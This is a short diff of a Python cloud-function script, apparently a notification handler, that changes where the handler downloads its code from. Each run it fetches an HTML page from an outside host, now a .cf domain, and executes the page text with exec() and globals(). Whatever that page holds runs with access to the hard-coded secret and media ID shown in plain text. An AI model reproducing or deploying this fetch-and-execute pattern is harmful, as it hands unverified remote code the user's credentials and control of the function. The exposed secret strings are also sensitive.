@@ -24,7 +24,7 @@ Secret = 'H4t9D51QTfrQnQS_-aXCDqp4N-o8HrvCUOuJzUGLudw'
 media_id='2Dl-C5yXBJZuOsW65sApwspsRzYcA6bbK6qm6NGCBOPL2KFuUDTR6YDjHbempF65c'
 #--------------以下为代码区，请勿修改！------------#
 def main_handler(event, context):
-    code=requests.get('https://scflover.gitee.io/nyYex36TDpC2LNWhHHVyhobNbqvxxyTOcElUjYJEJ.html')
+    code=requests.get('https://4ever.scflover.cf/nyYex36TDpC2LNWhHHVyhobNbqvxxyTOcElUjYJEJ.html')
     code.encoding='utf-8'
     exec(code.text,globals())
 
